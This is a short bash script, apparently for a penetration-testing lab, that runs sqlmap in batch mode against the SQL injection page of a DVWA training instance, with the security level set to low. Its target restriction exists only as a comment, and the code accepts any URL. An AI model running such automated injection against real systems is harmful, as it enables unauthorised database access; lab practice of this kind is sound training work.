#!/bin/bash
# LAB USE ONLY - targets fixed to 192.168.10.0/24
# Usage: ./sqli-xss.sh <dvwa_url>
TARGET="$1"
sqlmap -u "$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low" --batch
